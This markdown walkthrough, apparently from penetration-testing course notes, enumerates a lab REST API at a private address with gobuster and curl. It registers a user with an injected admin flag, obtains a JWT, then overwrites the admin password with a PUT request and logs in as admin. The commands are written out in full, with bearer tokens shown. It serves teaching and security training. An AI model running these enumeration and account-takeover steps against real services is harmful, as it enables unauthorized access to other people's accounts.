### Enumerating and Abusing APIs

A specific sort of API is called REST, or Representational State Transfer.  It is used for a variety of purposes, including authentication.

We can use `gobuster` features to brute force API endpoints.  

API paths are often followed by a version number.  The pattern usually follows the following format.

`/api_name/v1`

Knowing this, we'll create a txt file and put the following in.

```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

Here, the `{GOBUSTER}` is used as a placeholder so when we run the `gobuster` tool, it will use this spot to insert the word from the word list.  We're only doing 2 versions in this one for simplicity and brevity.

`gobuster dir -u http://192.168.178.16:5002 -w /usr/share/wordlists/dirb/big.txt -p apipattern.txt`

This, again, focuses on the dir aspect.  We know the other parts.  The new wrinkle here is the `-p apipattern.txt` portion.  When we created the file just a moment ago with the GOBUSTER in {}'s, that's the insert point and the rest of the url line.  And wouldn't ya know it, we get a hit.

`books/v1` and `users/v1` comes back.

Now we can use `curl` to get some more inforamtion

`curl -i http://192.168.178.16:5002/users/v1`

![pic5.png](Images/pic5.png)

So the admin user looks interesting here, let's do some testing on it.

`gobuster dir -u http://192.168.178.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt`

Here, we're looking at the admin username and seeing what other API properties are related to the `username` property.

Looks like we get `/email` and `/password`.  Let's see what we can get with the `/password` one.

`curl -i http://192.168.178.16:5002/users/v1/admin/password`

That returns the following...

![pic6.png](Images/pic6.png)

The 405 with Method not Allowed suggests that the url is there but the `GET` method (curl's default) is not allowed.  Other methods though may overwrite the password so we need to test more before we try those.

`curl -i http://192.168.178.16:5002/users/v1/login`

![pic7.png](Images/pic7.png)

We do get 404 but we also see that the user is not found meaning there is a login, the login just failed.  So, let's try a dummy password to see what we get.

`curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.178.16:5002/users/v1/login`

![pic8.png](Images/pic8.png)

So random password does not work but the parameters are correct (the `-d` field).  So let's try to register a new user and see if that opens up any attack surfaces.

`curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.178.16:5002/users/v1/register`

![pic9.png](Images/pic9.png)

So now it's saying we need to add an email.  So let's do that.  We can also give another field a try.  Let's see if we can set a possible `admin` property to `True`.

`curl -d '{"password":"test","username":"cman","email":"cman@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.178.16:5002/users/v1/register`

![pic10.png](Images/pic10.png)

Interesting, it took the admin token without erroring out.  It remains to be seen if it's actually an admin account but lets give it a go.  We'll use the same login we made earlier but update it with the just created creds.

`curl -d '{"password":"test","username":"cman"}' -H 'Content-Type: application/json'  http://192.168.178.16:5002/users/v1/login`

![pic11.png](Images/pic11.png)

Now, lets test to see if we're a legitimate admin user.

`curl  \
  'http://192.168.178.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NjE1MDM1ODAsImlhdCI6MTc2MTUwMzI4MCwic3ViIjoiY21hbiJ9.6WJKQaahLBM96k-24yfYWBATHupCLaSkFh6v2raomp8' \
  -d '{"password": "pwned"}'`

  ![pic12.png](Images/pic12.png)

  Interesting, once again, `Method not Allowed` is given.  Let's change the method then.

  `curl -X 'PUT' \
  'http://192.168.178.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NjE1MDQ0NjksImlhdCI6MTc2MTUwNDE2OSwic3ViIjoiY21hbiJ9.z6PYZZ9KwX8wpxmsXPLPS2HLBaXnEyEj8hc994xgIxk' \
  -d '{"password": "pwned"}'`

  ![pic13.png](Images/pic13.png)

Interesting, we don't get any error message.  That normally means it worked.  Let's test it.

`curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.178.16:5002/users/v1/login`

![pic14.png](Images/pic14.png)

Looks like we've compromised the `admin` account!!

If we append the previous command with `--proxy 127.0.0.1:8080` and have burpsuite open, we can send this through burpsuite and then automate some things.